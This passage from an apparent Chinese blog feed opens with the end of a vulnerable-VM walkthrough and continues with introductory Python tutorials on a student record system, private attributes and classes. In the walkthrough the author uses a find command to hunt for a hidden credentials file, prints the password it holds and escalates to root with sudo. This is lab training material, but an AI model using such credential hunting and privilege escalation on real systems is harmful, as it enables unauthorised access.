<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br></pre></td></tr></table></figure>

<p>拿到第三个flag并且提示我们要找到technawi的密码才能查看flag.txt，改密码放在一个隐秘的地方。<br>寻找用户名为technawi并且我们有权限访问的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user technawi |grep -v &quot;Permission&quot; &gt;1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/03/xAlN926vXoqUeO8.png"></p>
<p>在<code>credentials.txt</code>中发现第四个flag以及technawi的密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br></pre></td></tr></table></figure>

<p>登录进该用户，查看flag.txt，拿到第五个flag</p>
<img src="https://i.loli.net/2020/09/03/sye83cf7Ba51ChI.png" style="zoom:150%;" />

<p>到这里整个靶机已经打完了，该用户还不是root用户，本着打到底的想法，提权到root用户，用sudo -l查看一下sudo的权限，结果发现该用户拥有完整的sudo权限，直接sudo su等到进root用户。</p>
<h1 id="6、总结"><a href="#6、总结" class="headerlink" title="6、总结"></a>6、总结</h1><p>这个靶机实际上是一个比较基础的靶机，针对的是文件上传漏洞，文件上传位置一定要控制好权限等问题。其他的也没什么可以说的。</p>
]]></content>
      <categories>
        <category>靶机训练</category>
      </categories>
      <tags>
        <tag>靶机训练</tag>
      </tags>
  </entry>
  <entry>
    <title>基础练习二</title>
    <url>/post/c99c4ab1.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——基础练习二</p>
</blockquote>
<hr>
<span id="more"></span>

<h5 id="1、题目及要求"><a href="#1、题目及要求" class="headerlink" title="1、题目及要求"></a>1、题目及要求</h5><blockquote>
<p>制作简单的学生信息录入系统</p>
<p><strong>要求</strong>：</p>
<ul>
<li>增加学生信息					</li>
<li>查找学生信息</li>
<li>删除学生信息</li>
</ul>
</blockquote>
<h5 id="2、部分代码展示"><a href="#2、部分代码展示" class="headerlink" title="2、部分代码展示"></a>2、部分代码展示</h5><h6 id="2-1、增加学生信息函数"><a href="#2-1、增加学生信息函数" class="headerlink" title="2.1、增加学生信息函数"></a>2.1、增加学生信息函数</h6><p>学生信息应包括学生学号、学生姓名、性别、年龄等。</p>
<p>增加学生信息这个函数的关键在于，学生信息用什么类型的数据来表示？由于这里不涉及持久化存储，所以我们不需要考虑存储到硬盘的方式。在这里我们可以使用字典来表示每个学生的信息，用学号来作为每个学生的key，key是唯一的，用学号刚好合适，因为每个学生的学号肯定是不同的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Add_students</span>(<span class="params">ID,Name,Sex,Age</span>):</span><br><span class="line">    <span class="keyword">if</span>  ID &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n学号ID格式错误,学号必须为正整数\n即将回到选项页面\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> Sex <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;女&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n性别Sex格式错误,性别只能输入男或者女\n即将回到选项页面\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span>  Age &gt; <span class="number">100</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n年龄格式有误,年龄可输入范围在1-100之间\n即将回到选项页面\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    Student_Dict[ID]=&#123;<span class="string">&#x27;姓名&#x27;</span>:Name,<span class="string">&#x27;性别&#x27;</span>:Sex,<span class="string">&#x27;年龄&#x27;</span>:Age&#125;</span><br><span class="line">    <span class="keyword">return</span> Student_Dict</span><br></pre></td></tr></table></figure>



<h6 id="2-2、查找学生信息"><a href="#2-2、查找学生信息" class="headerlink" title="2.2、查找学生信息"></a>2.2、查找学生信息</h6><p>查找学生信息需要通过名字来进行查找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Seek_student</span>(<span class="params">Name</span>):</span><br><span class="line">    <span class="keyword">if</span> Student_Dict:</span><br><span class="line">        is_seek = <span class="literal">False</span></span><br><span class="line">        ids = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ID <span class="keyword">in</span> Student_Dict:</span><br><span class="line">            <span class="keyword">if</span> Name == Student_Dict[ID][<span class="string">&#x27;姓名&#x27;</span>]:</span><br><span class="line">                ids += <span class="number">1</span></span><br><span class="line">                is_seek = <span class="literal">True</span></span><br><span class="line">                Sex = Student_Dict[ID][<span class="string">&#x27;性别&#x27;</span>]</span><br><span class="line">                Age = Student_Dict[ID][<span class="string">&#x27;年龄&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\n寻找到的学生<span class="subst">&#123;ids&#125;</span>\n学号：<span class="subst">&#123;ID&#125;</span>\n&#x27;</span> +</span><br><span class="line">                      <span class="string">f&#x27;姓名：<span class="subst">&#123;Name&#125;</span>\n性别：<span class="subst">&#123;Sex&#125;</span>\n年龄：<span class="subst">&#123;Age&#125;</span>\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> is_seek == <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n没有找到学生信息\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n学生列表不存在或为空\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="2-3、删除学生信息"><a href="#2-3、删除学生信息" class="headerlink" title="2.3、删除学生信息"></a>2.3、删除学生信息</h6><p>删除学生信息需要通过学号来进行删除，这样才具有唯一性</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">del_stedent</span>(<span class="params">ID</span>):</span><br><span class="line">    <span class="keyword">if</span> ID &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n学号ID格式错误,学号必须为正整数\n即将回到选项页面\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> Student_Dict:</span><br><span class="line">        pop_student = Student_Dict.pop(ID, <span class="string">&#x27;\n没有该学生的信息\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pop_student != <span class="string">&#x27;没有该学生的信息&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;删除成功\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(pop_student)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n学生列表不存在或为空\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="2-4、主函数"><a href="#2-4、主函数" class="headerlink" title="2.4、主函数"></a>2.4、主函数</h6><p>最后需要增加一个主函数，主函数的作用是把各个函数互相调用起来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎登陆学生信息录入系统&quot;</span>.center(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;选择要进行的操作\n1、增加学生\n2、查找学生\n3、删除学生\n4、退出系统&quot;</span>)</span><br><span class="line">            options = <span class="built_in">input</span>(<span class="string">&quot;输入操作的选项：&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> options == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n学生信息新增页面&#x27;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ID = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;学生学号：&quot;</span>))</span><br><span class="line">                    Name = <span class="built_in">input</span>(<span class="string">&quot;学生姓名：&quot;</span>)</span><br><span class="line">                    Sex = <span class="built_in">input</span>(<span class="string">&quot;学生性别(男/女)：&quot;</span>)</span><br><span class="line">                    Age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;学生年龄：&quot;</span>))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n输入的信息格式错误,即将回到选项页面\n&#x27;</span>)</span><br><span class="line">                    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                add_return = Add_students(ID, Name, Sex, Age)</span><br><span class="line">                <span class="keyword">if</span> Student_Dict.get(ID, <span class="number">0</span>) != <span class="number">0</span> <span class="keyword">and</span> add_return != <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;新增成功\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">elif</span> Student_Dict.get(ID, <span class="number">0</span>) == <span class="number">0</span> <span class="keyword">and</span> add_return != <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;新增失败\n&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> options == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n学生信息寻找页面&#x27;</span>)</span><br><span class="line">                Name = <span class="built_in">input</span>(<span class="string">&quot;学生姓名：&quot;</span>)</span><br><span class="line">                Seek_student(Name)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> options == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n学生信息删除页面&#x27;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ID = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;学生学号：&quot;</span>))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n输入的信息格式错误,即将回到选项页面\n&#x27;</span>)</span><br><span class="line">                    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                del_stedent(ID)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> options == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n正在退出系统&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\n请输入正确的选项,即将回到选项页面\n&#x27;</span>)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:   <span class="comment">#捕捉因Ctrl+c退出程序导致的异常</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n正在退出系统&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Student_Dict = &#123;&#125;</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h5 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h5><p>上面的练习实际上是一个很简单的python应用，更多的python脚本python程序都比上面的复杂的多得多，但是不管是什么程序，程序逻辑都是最重要的，我们应该多练习练习，掌握这些基础内容。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象——访问限制</title>
    <url>/post/af5dabe3.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——面向对象之访问限制</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、私有属性和私有方法"><a href="#一、私有属性和私有方法" class="headerlink" title="一、私有属性和私有方法"></a>一、私有属性和私有方法</h4><p>在很多面向对象编程中，属性可以设置为私有属性，python中也是如此，但是python跟其他编程语言不同在于python并不从语法上严格保证私有属性的私密性，也就是说，虽然在python中设置了私有属性，但是实际上python只是对这个私有属性重新命名，在类的外部通过重命名后的变量名字任可访问到该私有属性。因此在python中针对私有属性的访问问题，程序员们会有一个共识——不要随便访问私有属性，访问对象属性统一通过对象方法去执行。python类中设置私有属性只需要在属性名字前加双下划线即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.__name=name</span><br><span class="line">        self.__age=age</span><br><span class="line"></span><br><span class="line">s1=Student(<span class="string">&#x27;z7sz&#x27;</span>,<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(s1.__name)   <span class="comment">#这一行会报错，__name是私有属性，无法在外部直接访问</span></span><br><span class="line"><span class="built_in">print</span>(s1._Student__name)  <span class="comment">#这一行不会报错并且可以得到属性值，但是最好不要这么做</span></span><br></pre></td></tr></table></figure>

<p>python中的私有方法跟私有属性是一样的。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">        self.__name=name</span><br><span class="line">        self.__age=age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.__name&#125;</span>:<span class="subst">&#123;self.__age&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__get()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(s1.get())</span><br><span class="line"><span class="built_in">print</span>(s1._Student__get())</span><br></pre></td></tr></table></figure>

<p>上面两行print都能执行成功，但是第二种方式最好不要这么做。</p>
<h4 id="二、property装饰器"><a href="#二、property装饰器" class="headerlink" title="二、property装饰器"></a>二、property装饰器</h4><p>前面说了因为私有属性的缘故，使得我们不能够像访问属性的方式来获取值，也不能像直接给私有属性赋值，因此我们通常都会另外写获取和赋值的函数来代替直接通过<code>对象.属性名</code>的方式来操作属性。但是这样毕竟没有直接通过<code>对象.属性名</code>方便，因此property装饰器负责把一个方法变成属性调用，这样就使得我们从<code>对象.方法名()</code>的方式变成<code>对象.属性名</code>的方式来操作属性。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.__name=name</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_name</span>(<span class="params">self,name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name,<span class="built_in">str</span>):  <span class="comment">#name必须为字符串</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;name must be an str!&#x27;</span>)</span><br><span class="line">        self.__name=name</span><br><span class="line"></span><br><span class="line">s=Student(<span class="string">&#x27;z7sz&#x27;</span>)</span><br><span class="line">s.set_name(<span class="string">&#x27;z7sz1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.get_name())</span><br></pre></td></tr></table></figure>

<p>上面这种方式是不通过装饰器，通过方法来访问数据的方式</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student_p</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.__name=name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @name.setter</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">self,name</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(name,<span class="built_in">str</span>):  <span class="comment">#name必须为字符串</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;name must be an str!&#x27;</span>)</span><br><span class="line">        self.__name=name</span><br><span class="line"></span><br><span class="line">s1=Student_p(<span class="string">&#x27;blog&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1.name)  <span class="comment">#直接通过&#x27;对象.属性&#x27;访问数据</span></span><br><span class="line">s1.name=<span class="string">&#x27;blog1&#x27;</span>  <span class="comment">#直接赋值</span></span><br><span class="line"><span class="built_in">print</span>(s1.name)</span><br></pre></td></tr></table></figure>

<p>@property涉及到两个方面，本身可以将getter方法变成属性，也就是读取的方法，@property本身又创建了另一个装饰器@xxx.setter，负责把一个setter方法变成属性赋值。所以在上面的代码中@property装饰器可以直接读取数据，@name.setter可以赋值。</p>
<p>而且通过该装饰器还可以实现某属性只读不写的功能，只写@property装饰器不写@name.setter则可以实现name属性的只读不写。</p>
<p>装饰器会在后面详细讲，在面向对象内容的装饰器大家可以先记得怎么用。</p>
<h4 id="三、-slots-魔法变量"><a href="#三、-slots-魔法变量" class="headerlink" title="三、__slots__ 魔法变量"></a>三、__slots__ 魔法变量</h4><p>上面的私有属性+装饰器实现了类中私有属性不能随便被读写，但是外部可以随意像类中写入属性。因此<code>__slots__变量</code>，可以用来限制class实例能添加的属性。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    __slots__=(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>) <span class="comment">#实例只能添加这两个属性</span></span><br><span class="line"></span><br><span class="line">a=A()</span><br><span class="line">a.name=<span class="string">&#x27;zsz&#x27;</span></span><br><span class="line">a.age=<span class="number">14</span></span><br><span class="line">a.sex=<span class="number">1</span>  <span class="comment">#这里会报错，因为A不允许实例添加除name和age之外的属性</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>面向对象编程入门</title>
    <url>/post/2e85498b.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——面向对象编程入门</p>
</blockquote>
<hr>
<span id="more"></span>

<h4 id="一、类和对象"><a href="#一、类和对象" class="headerlink" title="一、类和对象"></a>一、类和对象</h4><p>稍微有点编程的基础的人都知道面向对象编程，我们现在使用的大部分高级编程语言都支持面向对象编程。把一组数据和处理数据的方法组成<strong>对象</strong>，把行为相同的对象归纳为<strong>类</strong>，通过<strong>封装</strong>隐藏对象的内部细节，通过<strong>继承</strong>实现类的特化和泛化，通过<strong>多态</strong>实现基于对象类型的动态分派。</p>
<p>在面向对象编程中，<strong>类是一个抽象的概念，对象是一个具体的概念</strong>。我们把同一类对象的共同特征抽取出来就是一个类，比如我们经常说的人类，这是一个抽象概念，而我们每个人就是人类的这个抽象概念下的实实在在的存在，也就是一个对象。简而言之，<strong>类是对象的蓝图和模板，对象是类的实例，是可以接受消息的实体</strong>。</p>
<p>在面向对象编程的世界中，<strong>一切皆为对象</strong>，<strong>对象都有属性和行为</strong>，<strong>每个对象都是独一无二的</strong>，而且<strong>对象一定属于某个类</strong>。对象的属性是对象的静态特征，对象的行为是对象的动态特征。也就是说，如果我们把拥有共同特征的对象的属性和行为都抽取出来，就可以定义出一个类。</p>
<h5 id="1、定义类"><a href="#1、定义类" class="headerlink" title="1、定义类"></a>1、定义类</h5><p>在Python中，可以使用<code>class</code>关键字加上类名来定义类，写在类里面的函数我们通常称之为<strong>方法</strong>，方法就是对象的行为，方法的第一个参数通常都是<code>self</code>，它代表了接收这个消息的对象本身。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;汽车启动了&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">car_brand</span>(<span class="params">self,brand_name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;汽车品牌是<span class="subst">&#123;brand_name&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>对象名字首字母一般用大写表示</p>
<h5 id="2、创建和使用对象"><a href="#2、创建和使用对象" class="headerlink" title="2、创建和使用对象"></a>2、创建和使用对象</h5><p>在我们定义好一个类之后，可以使用构造器语法来创建对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">car1=Car()</span><br><span class="line">car2=Car()</span><br><span class="line"><span class="built_in">print</span>(car1)  <span class="comment">#&lt;__main__.Car object at 0x000002E14415C490&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面我们创建了两个对象，分别为car1和car2，接下来，我们调用对象的方法，即创建类时定义的两个方法。两个方法的第一个参数self代表了接收消息的汽车对象，car_brand方法的第二个参数是汽车的品牌名称。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#调用start方法，有两种方式调用</span></span><br><span class="line"><span class="comment">#第一种是通过“对象.方法”调用方法，点前面的对象就是接收消息的对象</span></span><br><span class="line"><span class="comment">#第二种是通过“类.方法”调用方法，第一个参数是接收消息的对象</span></span><br><span class="line">car1.start()     <span class="comment">#汽车启动了</span></span><br><span class="line">Car.start(car1)  <span class="comment">#汽车启动了</span></span><br><span class="line"></span><br><span class="line">car1.car_brand(<span class="string">&#x27;比亚迪&#x27;</span>)    <span class="comment">#汽车品牌是比亚迪</span></span><br><span class="line">Car.car_brand(car1,<span class="string">&#x27;比亚迪&#x27;</span>)  <span class="comment">#汽车品牌是比亚迪</span></span><br></pre></td></tr></table></figure>

<p>我们一般比较常用的是第一种方法。第二种方法相对于第一种方法而言，第二种方法更容易理解一点。</p>
<h5 id="3、-init-方法"><a href="#3、-init-方法" class="headerlink" title="3、__init__方法"></a>3、<code>__init__</code>方法</h5><p>在我们上面创建的汽车对象只有行为没有属性，如果想对汽车对象定义属性，我们可以为类添加一个<code>__init__</code>方法。在创建对象时，通过自动执行<code>__init__</code>方法，完成对象对内存的初始化，也就是把对象数据放到内存空间中。所以我们可以添加<code>__init__</code>方法为对象指定属性，同时完成对属性赋初始值的操作，因此，该方法也被称为初始化方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand_name, color</span>):</span><br><span class="line">        self.brand_name = brand_name</span><br><span class="line">        self.color = color</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;汽车启动了&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">car_brand</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;那辆<span class="subst">&#123;self.color&#125;</span>汽车品牌是<span class="subst">&#123;self.brand_name&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于初始化方法除了self之外还有两个参数</span></span><br><span class="line"><span class="comment"># 所以调用Car类的构造器创建对象时要传入这两个参数</span></span><br><span class="line">car1=Car(<span class="string">&#x27;比亚迪&#x27;</span>,<span class="string">&#x27;蓝色&#x27;</span>)</span><br><span class="line"></span><br><span class="line">car1.start()  <span class="comment">#汽车启动了</span></span><br><span class="line">car1.car_brand()  <span class="comment">#那辆蓝色汽车品牌是比亚迪</span></span><br></pre></td></tr></table></figure>

<h5 id="4、-repr-方法"><a href="#4、-repr-方法" class="headerlink" title="4、__repr__方法"></a>4、<code>__repr__</code>方法</h5><p>在python中，这种双下划线开头和结尾的方法都是有特殊用途的方法，我们一般称之为魔法方法。<code>__repr__</code>也是其中一个，在上面定义对象时，我们用print将其打印出来了，但是打印出来的是对象的内存地址，如果我们想要打印自定义信息，就需要用到这个魔法方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    <span class="comment"># 其他方法在这里就不写了，上面有</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.brand_name&#125;</span>,<span class="subst">&#123;self.color&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(car1)  <span class="comment">#比亚迪,蓝色</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(car1))  <span class="comment">#&lt;class &#x27;__main__.Car&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(car1.__repr__())  <span class="comment">#比亚迪,蓝色</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(car1.__repr__()))  <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="5、-new-方法"><a href="#5、-new-方法" class="headerlink" title="5、__new__方法"></a>5、<code>__new__</code>方法</h5><p><code>__new__</code>方法是构建对象的方法，之前的<code>__init__</code>方法是初始化构建出来的对象，不过一般我们都不需要重新定义<code>__new__</code>方法。该方法至少要有一个参数cls，代表要实例化的类，且必须返回当前类的对象，不然没法执行init方法。</p>
<h4 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h4><blockquote>
<p><strong>题目</strong>：制作简单的游戏战斗</p>
<p>1、创建三个游戏人物，分别是：</p>
<ul>
<li>小红，女，18，初始战斗力1000</li>
<li>小明，男，20，初始战斗力1800</li>
<li>小紫，女，19，初始战斗力2500</li>
</ul>
<p>2、游戏场景，分别：</p>
<ul>
<li>草丛战斗，消耗200战斗力</li>
<li>自我修炼，增长100战斗力</li>
<li>多人游戏，消耗500战斗力</li>
</ul>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Game</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender, age, volume</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.gender = gender</span><br><span class="line">        self.age = age</span><br><span class="line">        self.volume = volume</span><br><span class="line">        self.surplus_volume = volume</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 草丛战斗</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">grass_battle</span>(<span class="params">self</span>):</span><br><span class="line">        self.surplus_volume -= <span class="number">200</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;草丛战斗，消耗200战斗力，还剩下<span class="subst">&#123;self.surplus_volume&#125;</span>战斗力&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自我修炼</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">practice</span>(<span class="params">self</span>):</span><br><span class="line">        self.surplus_volume += <span class="number">100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;自我修炼，增长100战斗力，还剩下<span class="subst">&#123;self.surplus_volume&#125;</span>战斗力&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多人游戏</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mary_battle</span>(<span class="params">self</span>):</span><br><span class="line">        self.surplus_volume -= <span class="number">500</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;多人游戏，消耗500战斗力，还剩下<span class="subst">&#123;self.surplus_volume&#125;</span>战斗力&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span 